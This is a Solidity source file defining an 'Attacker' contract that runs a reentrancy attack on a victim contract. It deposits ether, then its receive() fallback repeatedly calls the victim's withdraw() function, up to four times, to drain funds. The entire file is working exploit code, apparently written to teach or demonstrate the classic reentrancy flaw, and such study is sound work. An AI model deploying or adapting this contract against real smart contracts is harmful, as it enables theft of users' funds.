//SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

/**
 * @title Attacker
 * @dev A contract that performs a reentrancy attack on a vulnerable contract.
 */
contract Attacker {
    address public victim;
    uint256 public amount;
    uint256 public counter;

    /**
     * @dev Constructor function for the Attacker contract.
     * @param _victim The address of the victim contract.
     */
    constructor(address _victim) payable {
        victim = _victim;
        amount = msg.value;
    }

    /**
     * @dev Fallback function to receive ether. This is where the attacker takes advantage of recursion to perpetrate the attack.
     */
    receive() external payable {
        counter++;
        withdrawAttack();
    }

    /**
     * @dev Allows the attacker to make a payment.
     * @return success A boolean that indicates if the payment was successful.
     */
    function payIn() public returns (bool success) {
        (success, ) = payable(victim).call{value: amount}(
            abi.encodeWithSignature("payIn()")
        );
    }

    /**
     * @dev Adds the amount sent to the contract to the attacker's balance.
     */
    function addAmount() public payable {
        amount += msg.value;
    }

    /**
     * @dev Allows the attacker to initiate a reentrancy attack by calling the withdraw function of the vulnerable contract.
     */
    function withdrawAttack() public {
        if (counter < 4) {
            (bool success, ) = payable(victim).call(
                abi.encodeWithSignature("withdraw()")
            );
            // if not success we might also want to finish the attack
        }
    }

    /**
     * @dev Returns the balance of the contract.
     * @return The balance of the contract.
     */
    function contractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
